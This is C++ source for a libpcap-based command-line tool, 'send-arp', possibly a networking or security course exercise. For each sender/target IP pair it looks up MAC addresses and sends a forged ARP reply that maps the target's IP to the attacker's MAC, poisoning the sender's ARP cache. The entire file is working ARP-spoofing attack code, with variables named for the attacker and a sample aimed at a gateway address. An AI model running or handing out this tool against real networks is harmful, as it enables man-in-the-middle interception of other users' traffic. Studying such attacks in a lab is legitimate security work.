#include "ethhdr.h"
#include "arphdr.h"
#include "utils.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return EXIT_FAILURE;
	}

	for (int i = 2; i <= argc-1; i += 2)
	{
		printf("\n----------------------------------------\n");
		printf("[*] send-arp #%d..",i/2);
		printf("\n----------------------------------------\n");

		char *dev = argv[1];
		const char *interfaceName = argv[1];
		
		Ip attackerIp;
		Mac attackerMac;
		
		getHostInfo(interfaceName, &attackerIp, &attackerMac);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (pcap == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return EXIT_FAILURE;
		}
		printf("\n----------------------------------------\n");
		printf("[*] get sender Info..");
		printf("\n----------------------------------------\n");

		Ip senderIp = Ip(argv[i]);
		Mac senderMac = getMac(pcap, attackerIp, attackerMac, senderIp);
		printf("[+] senderIp    : %s\n", std::string(senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(senderMac).c_str());

		printf("\n----------------------------------------\n");
		printf("[*] get target Info..");
		printf("\n----------------------------------------\n");

		Ip targetIp = Ip(argv[i+1]);
		Mac targetMac = getMac(pcap, attackerIp, attackerMac, targetIp);
		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
		
		// Dynamically construct and send ARP Reply packet
		EthArpPacket packet;
		packet.eth_.dmac_ = senderMac;
		packet.eth_.smac_ = attackerMac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = attackerMac;
		packet.arp_.sip_ = htonl(targetIp);
		packet.arp_.tmac_ = senderMac;
		packet.arp_.tip_ = htonl(senderIp);

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}

		pcap_close(pcap);
	}
}
